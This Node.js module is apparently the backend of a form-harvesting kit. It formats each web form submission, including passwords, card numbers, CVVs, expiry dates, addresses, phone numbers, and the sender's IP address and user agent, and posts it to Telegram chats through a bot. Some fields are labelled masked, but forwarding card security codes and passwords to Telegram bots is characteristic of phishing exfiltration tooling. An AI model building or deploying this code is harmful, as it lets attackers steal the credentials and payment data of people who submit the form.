const axios = require('axios');
const config = require('../config/config');
const logger = require('../utils/logger');

class TelegramService {
    constructor() {
        this.botToken = config.telegram.botToken;
        this.chatIds = config.telegram.chatIds;
        this.apiBaseUrl = config.telegram.apiBaseUrl;
        this.initialized = this.validateConfig();
    }

    validateConfig() {
        const issues = [];
        if (!this.botToken) {
            issues.push('TELEGRAM_BOT_TOKEN is not configured');
        }
        if (!this.chatIds || this.chatIds.length === 0) {
            issues.push('TELEGRAM_CHAT_ID is not configured');
        }
        if (issues.length > 0) {
            logger.warn(`Telegram service configuration issues: ${issues.join(', ')}`);
            return false;
        }
        return true;
    }

    isAvailable() {
        return this.initialized;
    }

    formatMessage(submissionId, sanitizedData, meta = {}) {
        const timestamp = meta.createdAt || new Date().toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta',
        });

        const lines = [];

        lines.push('🔔 *NOTIFIKASI SUBMIT BARU*');
        lines.push('');
        lines.push(`📋 *ID Submit:* \`${submissionId}\``);
        lines.push(`🕒 *Waktu:* ${this.escapeMarkdown(timestamp)}`);
        lines.push('');
        lines.push('📝 *Detail Data Pengguna:*');
        lines.push('');

        for (const [key, value] of Object.entries(sanitizedData)) {
            const displayKey = this.formatFieldName(key);
            const displayValue = this.formatFieldValue(value);
            lines.push(`*${this.escapeMarkdown(displayKey)}:* ${displayValue}`);
        }

        lines.push('');
        if (meta.clientIp) {
            lines.push(`🌐 *IP Pengirim:* \`${meta.clientIp.replace(/\\/g, '\\\\').replace(/`/g, '\\`')}\``);
        }
        if (meta.userAgent && meta.userAgent !== 'unknown') {
            const shortUA = meta.userAgent.length > 80 ? meta.userAgent.substring(0, 77) + '...' : meta.userAgent;
            lines.push(`💻 *User Agent:* \`${shortUA.replace(/\\/g, '\\\\').replace(/`/g, '\\`')}\``);
        }
        lines.push('');
        lines.push('━━━━━━━━━━━━━━━━━━━━━━━━━');
        lines.push('✅ *Sistem Notifikasi Otomatis*');

        return lines.join('\n');
    }

    formatFieldName(key) {
        const nameMap = {
            email: 'Email',
            password: 'Password (Masked)',
            username: 'Username',
            nama: 'Nama Lengkap',
            name: 'Nama',
            phone: 'No. Telepon',
            telephone: 'No. Telepon',
            hp: 'No. HP',
            alamat: 'Alamat',
            address: 'Alamat',
            kota: 'Kota',
            city: 'Kota',
            provinsi: 'Provinsi',
            negara: 'Negara',
            kodepos: 'Kode Pos',
            zipcode: 'Kode Postal',
            credit_card: 'Kartu Kredit (Masked)',
            card_number: 'No. Kartu (Masked)',
            cc_number: 'No. CC (Masked)',
            cvv: 'CVV (Masked)',
            ccv: 'CCV (Masked)',
            expiry: 'Masa Berlaku',
            amount: 'Jumlah',
            total: 'Total',
            order_id: 'Order ID',
            product: 'Produk',
        };
        const lower = String(key).toLowerCase();
        return nameMap[lower] || this.capitalizeWords(key);
    }

    formatFieldValue(value) {
        if (value === null || value === undefined || value === '') {
            return '_Tidak diisi_';
        }
        if (typeof value === 'object') {
            try {
                return '`' + JSON.stringify(value).replace(/\\/g, '\\\\').replace(/`/g, '\\`') + '`';
            } catch {
                return this.escapeMarkdown(String(value));
            }
        }
        const str = String(value);
        if (str.length > 200) {
            return '`' + str.substring(0, 197).replace(/\\/g, '\\\\').replace(/`/g, '\\`') + '...`';
        }
        if (this.needsCodeBlock(str)) {
            return '`' + str.replace(/\\/g, '\\\\').replace(/`/g, '\\`') + '`';
        }
        return this.escapeMarkdown(str);
    }

    needsCodeBlock(str) {
        return /[\*\_\`\[\]\(\)\~\#\+\-\=\|\{\}\.\!\>]/.test(str);
    }

    capitalizeWords(str) {
        return String(str)
            .replace(/[_-]/g, ' ')
            .replace(/\b\w/g, (c) => c.toUpperCase());
    }

    escapeMarkdown(text) {
        return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
    }

    async sendMessage(submissionId, sanitizedData, meta = {}) {
        if (!this.isAvailable()) {
            const error = new Error('Telegram service is not configured (missing bot token or chat id)');
            logger.warn('Telegram send skipped: not configured', { submission_id: submissionId });
            return { success: false, skipped: true, error: error.message };
        }

        const message = this.formatMessage(submissionId, sanitizedData, meta);
        const results = [];
        let overallSuccess = true;
        let lastError = null;

        for (const chatId of this.chatIds) {
            try {
                const url = `${this.apiBaseUrl}/bot${this.botToken}/sendMessage`;
                const payload = {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'MarkdownV2',
                    disable_web_page_preview: true,
                };

                const response = await axios.post(url, payload, {
                    timeout: 15000,
                    headers: { 'Content-Type': 'application/json' },
                    httpsAgent: new (require('https').Agent)({
                        rejectUnauthorized: true,
                        minVersion: 'TLSv1.2',
                    }),
                });

                if (response.data && response.data.ok) {
                    results.push({
                        chat_id: chatId,
                        success: true,
                        message_id: response.data.result?.message_id,
                    });
                    logger.info(`Telegram notification sent to ${chatId}`, { submission_id: submissionId });
                } else {
                    overallSuccess = false;
                    lastError = response.data?.description || 'Unknown Telegram API error';
                    results.push({
                        chat_id: chatId,
                        success: false,
                        error: lastError,
                    });
                    logger.error(`Telegram send failed to ${chatId}`, {
                        submission_id: submissionId,
                        error: lastError,
                    });
                }
            } catch (error) {
                overallSuccess = false;
                const errMsg = error.response?.data?.description || error.message || 'Network error';
                lastError = errMsg;
                results.push({
                    chat_id: chatId,
                    success: false,
                    error: errMsg,
                });
                logger.error(`Telegram send exception to ${chatId}`, {
                    submission_id: submissionId,
                    error: errMsg,
                    stack: error.stack,
                    status: error.response?.status,
                });
            }
        }

        return {
            success: overallSuccess,
            skipped: false,
            error: lastError,
            results,
        };
    }

    async testConnection() {
        if (!this.isAvailable()) {
            return { success: false, error: 'Telegram not configured' };
        }
        try {
            const url = `${this.apiBaseUrl}/bot${this.botToken}/getMe`;
            const response = await axios.get(url, {
                timeout: 10000,
                httpsAgent: new (require('https').Agent)({
                    rejectUnauthorized: true,
                    minVersion: 'TLSv1.2',
                }),
            });
            if (response.data?.ok) {
                return {
                    success: true,
                    bot: response.data.result,
                };
            }
            return { success: false, error: response.data?.description || 'Invalid response' };
        } catch (error) {
            return {
                success: false,
                error: error.response?.data?.description || error.message,
            };
        }
    }
}

const telegramService = new TelegramService();
module.exports = telegramService;
